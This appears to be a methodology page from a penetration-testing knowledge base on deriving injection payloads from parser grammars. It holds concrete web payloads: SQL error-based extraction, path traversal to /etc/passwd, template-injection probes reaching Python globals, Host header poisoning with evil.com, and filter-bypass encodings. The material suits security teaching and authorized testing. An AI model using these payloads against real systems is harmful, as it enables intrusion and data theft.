# First Principles: Deriving Payloads

Every payload in `10-reference/` was derived once by someone who understood the parser.
When the list fails, derive. This file is how.

---

## The derivation loop

```
1. Identify the parser (from error strings, headers, framework, file extension)
2. Recall the parser's grammar — what is data and what is syntax to it?
3. Find the boundary where data becomes syntax
4. Build the smallest string that crosses it
5. Confirm with the cheapest observable
6. Then add the wrapper the app needs (encoding, quoting, context)
```

Step 2 is the whole skill. Grammar knowledge is transferable; payloads are not.

---

## Parser grammars and their escape hatches

| Parser | Data | Syntax | The crossing |
|---|---|---|---|
| SQL | string literal | `'` `"` `--` `/*` `;` | close the quote, then inject |
| Shell | argument | space `;` `|` `&` `$()` `` ` `` newline | break the argument |
| Template (Jinja/Twig) | text | `{{ }}` `{% %}` `${ }` | get inside the delimiters |
| XML | text node | `<` `>` `&` `]]>` | close the node, add an entity |
| LDAP | filter value | `(` `)` `*` `\` | break the filter group |
| XPath | literal | `'` `"` `[` `]` `|` | close the literal |
| Regex (PCRE) | pattern | `.` `*` `+` `(` `)` `\` | ReDoS or bypass the match |
| JSON | string | `"` `\` `{` `}` `,` | break out of the string |
| YAML | scalar | `:` newline `-` `&` `*` `!!` | new key, tag, or anchor |
| CSV | field | `,` `"` newline | quote-break, field shift |
| Markdown | text | `[` `](` `` ` `` `<` | link/HTML injection |
| Path | segment | `/` `..` `%00` `;` | traversal, truncation |
| URL | component | `?` `#` `&` `%` | parameter injection, fragment cut |
| HTTP | message | CRLF, `:` , chunk size | header/request splitting |

---

## Worked derivations

**A sort parameter.** Error says `ORDER BY near 'foo'`. Grammar: identifiers, not
strings. So: `(select 1)` → boolean in ORDER BY; `case when (1=1) then 1 else 2 end` →
conditional ordering; `extractvalue(1,concat(0x7e,(select version())))` → error-based.

**A filename in a download endpoint.** Path segment. Grammar: path. So: `../../etc/passwd`,
then `..%2f`, then `....//`, then `..%252f`, then absolute `/etc/passwd`, then
`/proc/self/cwd/../../etc/passwd`. Each is the same idea with a different normalizer
assumption.

**A template-rendered email subject.** Text node in a template. Grammar: `{{ }}`. So:
`{{7*7}}` → 49. Then `{{7*'7'}}` distinguishes Jinja (49) from Twig (7777777). Then
`{{config}}`, then `{{cycler.__init__.__globals__}}`.

**A `Host` header.** Grammar: hostname. So: `evil.com` → does the reset link use it?
Then `evil.com:443@target.com`, then `target.com.evil.com`, then `127.0.0.1`, then
`[::1]`, then `target.com%00.evil.com`.

---

## Type confusion as a first principle

Wherever a value can be a scalar or a structure, try the structure.

```
id=1        → id[]=1        → id[0]=1       → id={"a":1}
id=1&id=2   → id=1,2        → id[1]=1&id[2]=2
role=user   → role[]=user   → role[user]=1
```

Frameworks coerce differently: PHP takes the last, Rails takes the first, Express makes
an array, Spring binds by name. The coercion *is* the bug when a check reads one value
and the sink reads another.

---

## Normalization as a first principle

Every layer normalizes. Find a string that normalizes to X at layer 1 but stays X at
layer 2.

```
..%2f  ..%252f  ..%c0%af  ..%e0%80%af  ....//  ..;/  ..%00/
%2e%2e/  %2e%2e%5c  .%2e/  ..%5c  ..\  ....\\
```

Same for case (`SeLeCt`), whitespace (`/**/`, `%09`, `%0a`, `+`), and keywords
(`UNI/**/ON`, `SEL/**/ECT`).

---

## When to stop deriving

Derive until the observable changes or three grammars are exhausted. Then write the
result in `mutations.md` with the parser and the rung, and move to the next parameter.
Derivation is fast when the model is right; if it feels slow, the model is wrong — go
back to `understanding-model.md` Q2 and re-identify the parser.

---

## Go deeper

1. Read the framework's own source for the parser. `grep -r "ORDER BY" vendor/` teaches
   more than any cheatsheet.
2. Send a deliberately malformed value and read the stack trace. It names the exact
   function and line.
3. Build a 5-line Python fuzzer that mutates one seed payload through the encoding
   matrix in `03-bypass/filter-bypass-encoding.md` and flags any response whose length
   differs from baseline by >5%.

---

## Related

- `11-regex/README.md`
- `00-core/connection-map.md`
- `09-playbooks/master-checklist.md`
